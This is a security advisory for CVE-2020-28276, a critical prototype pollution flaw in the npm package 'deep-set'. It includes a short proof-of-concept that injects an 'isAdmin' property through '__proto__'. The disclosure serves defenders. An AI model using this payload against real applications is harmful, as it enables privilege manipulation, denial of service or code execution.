# [C] Prototype pollution vulnerability in 'deep-set'

## Summary
Severity: Critical
Advisory: GHSA-wgxm-rg53-h2c6
CVE: CVE-2020-28276
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2022-05-24
Source: https://github.com/advisories/GHSA-wgxm-rg53-h2c6
Type: github-advisory

## Affected
- npm: `deep-set` — affected >=1.0.0

## Details
The NPM module 'deep-set' can be abused by Prototype Pollution vulnerability since the function `deepSet()` does not check for the type of object before assigning value to the property. Due to this flaw an attacker could create a non-existent property or able to manipulate the property which leads to Denial of Service or potentially Remote code execution.

### PoC
```js
var deepSet = require('deep-set')
var obj = {'1':'2'}
console.log(obj.isAdmin);
deepSet(obj, '__proto__.isAdmin', 'true')
console.log(obj.isAdmin);
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-28276
- https://github.com/klaemo/deep-set
- https://github.com/klaemo/deep-set/blob/103d650b3de1f5c6cf051236347ba59e7274cd07/index.js#L39
- https://web.archive.org/web/20210320110509/https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28276
